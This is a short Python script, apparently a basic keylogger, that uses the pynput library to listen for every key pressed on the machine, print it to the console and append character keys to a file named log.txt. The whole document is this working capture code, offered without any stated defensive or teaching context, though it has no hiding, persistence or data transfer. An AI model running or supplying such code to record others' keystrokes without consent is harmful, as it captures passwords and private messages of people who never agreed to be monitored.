from pynput import keyboard

def keyPressed(key):   
    print(str(key))
    with open("log.txt", 'a') as LogKey:
        try:
            char =  key.char
            LogKey.write(char)
        except:
            print("Error obtaining char")    


if __name__ == "__main__":
    listener = keyboard.Listener(on_press = keyPressed)
    listener.start()
    input()
